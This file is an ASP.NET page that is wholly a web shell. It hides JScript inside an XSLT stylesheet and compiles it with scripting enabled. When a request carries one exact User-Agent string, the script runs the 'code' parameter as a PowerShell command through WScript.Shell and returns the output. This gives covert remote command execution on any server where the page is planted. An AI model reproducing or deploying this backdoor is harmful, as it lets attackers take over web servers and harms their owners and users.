<%@page language="C#"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Xml"%>
<%@ import Namespace="System.Xml.Xsl"%>
<%

string xml=@"<?xml version=""1.0""?><root></root>";string xslt=@"<?xml version='1.0'?>
<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:code=""PyShell"">

  <msxsl:script language=""JScript"" implements-prefix=""code"">
  <msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>
  <msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>
  <msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>
  <msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>

    <![CDATA[function xml(){
    var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;
    var command = Request.Item['code'];
    var useragent = Request.Headers[""User-Agent""].ToString();
    if (useragent == ""Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0""){
    var r = new ActiveXObject(""WScript.Shell"").Exec(""powershell "" + command);
    var OutStream = r.StdOut;
    var Str = """";

    while (!OutStream.atEndOfStream) {Str = '<pre>' + Str + OutStream.readAll() + '</pre>';}
    Response.Write(Str);}}]]>

</msxsl:script>
<xsl:template match=""/root"">
<xsl:value-of select=""code:xml()""/>
</xsl:template>
</xsl:stylesheet>";

try {
XmlDocument xmldoc=new XmlDocument();
xmldoc.LoadXml(xml);
XmlDocument xsldoc=new XmlDocument();
xsldoc.LoadXml(xslt);
XsltSettings xslt_settings = new XsltSettings(false, true);
xslt_settings.EnableScript = true;

  XslCompiledTransform xct=new XslCompiledTransform();
  xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());
  xct.Transform(xmldoc,null,new MemoryStream());}

catch (Exception e){Response.Write("Error");}
%>